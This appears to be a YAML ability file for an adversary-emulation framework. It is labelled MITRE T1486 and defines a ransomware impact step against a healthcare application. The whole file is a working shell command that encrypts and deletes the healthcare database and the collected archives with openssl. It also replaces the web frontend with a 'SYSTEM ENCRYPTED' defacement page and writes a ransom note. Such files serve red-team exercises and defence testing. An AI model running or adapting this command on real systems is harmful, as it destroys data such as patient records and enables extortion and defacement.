- id: "impact-sim-encrypt"
  name: "Encrypt Collected Data"
  description: "Encrypts collected healthcare data and drops a ransom note."
  tactic: "impact"
  technique:
    attack_id: "T1486"
    name: "Data Encrypted for Impact"
  platforms:
    linux:
      sh:
        timeout: 120
        command: |
          OUTDIR="/tmp/recon"; R_KEY="RansomKey_$(hostname)_$(date +%s)"; K_FILE="$OUTDIR/.ransom_key"; DB_FILE="/app/healthcare.db"; FRONTEND_INDEX="/app/frontend/index.html"; echo "$R_KEY" > "$K_FILE"; echo "[!] Starting encryption of live system..."; if [ -f "$DB_FILE" ]; then openssl enc -aes-256-cbc -pbkdf2 -pass "pass:$R_KEY" -in "$DB_FILE" -out "$DB_FILE.ransom" && rm "$DB_FILE" && echo "[!] DATABASE ENCRYPTED: $DB_FILE"; fi; if [ -f "$FRONTEND_INDEX" ]; then echo '<!DOCTYPE html><html><head><title>HACKED</title></head><body style="background:#000;color:#ff0000;font-family:monospace;text-align:center;padding-top:100px;"><h1>☣️ SYSTEM ENCRYPTED ☣️</h1><h2>Your healthcare records have been locked.</h2><p>Contact us for the decryption key.</p></body></html>' > "$FRONTEND_INDEX" && echo "[!] FRONTEND DEFACED"; fi; for f in "$OUTDIR"/*.json "$OUTDIR"/*.tar.gz; do [ -f "$f" ] || continue; openssl enc -aes-256-cbc -pbkdf2 -pass "pass:$R_KEY" -in "$f" -out "$f.ransom" && rm "$f" && echo "[!] Encrypted: $f"; done; echo "========================================" > "$OUTDIR/README_DECRYPT.txt"; echo "  YOUR FILES HAVE BEEN ENCRYPTED" >> "$OUTDIR/README_DECRYPT.txt"; echo "========================================" >> "$OUTDIR/README_DECRYPT.txt"; echo "The database and all backups are gone." >> "$OUTDIR/README_DECRYPT.txt"; echo "Encryption key: $R_KEY" >> "$OUTDIR/README_DECRYPT.txt"; cat "$OUTDIR/README_DECRYPT.txt"